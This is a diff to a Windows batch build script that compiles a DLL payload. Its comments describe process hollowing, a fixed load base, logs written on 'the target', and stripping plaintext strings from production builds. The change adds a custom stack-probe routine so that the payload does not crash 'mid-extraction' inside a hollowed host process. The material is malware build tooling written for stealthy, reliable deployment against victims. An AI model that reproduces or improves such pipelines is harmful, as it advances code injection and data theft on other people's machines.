@@ -22,7 +22,13 @@ REM /NODEFAULTLIB /ENTRY:payload_entry: no CRT runtime
 REM /DYNAMICBASE:NO /BASE:0x5F000000: fixed base for process hollowing
 REM /DDEBUG: debug builds ONLY - writes C:\ProgramData\MediaCache\cache.log on the target and
 REM          embeds plaintext strings. Production builds must NOT define DEBUG.
-cl /nologo /LD /Od /Oi- /GS- /Gs1048576 src\ckdll.cpp /Fe:bin\ckdll.dll ^
+REM /Gs4096: every frame >= 4KB gets a stack probe. The probe is OUR chkstk.asm
+REM          (/NODEFAULTLIB has no __chkstk). Without it a large frame on the
+REM          fresh remote thread of the hollowed host skips the guard page and
+REM          the payload dies silently mid-extraction.
+ml64 /c /nologo /Fo bin\chkstk.obj src\chkstk.asm
+if errorlevel 1 (echo ML64 FAILED & exit /b 1)
+cl /nologo /LD /Od /Oi- /GS- /Gs4096 src\ckdll.cpp bin\chkstk.obj /Fe:bin\ckdll.dll ^
    /link /DLL /INCREMENTAL:NO /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000 ^
          /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib
 if errorlevel 1 (echo DLL BUILD FAILED & exit /b 1)
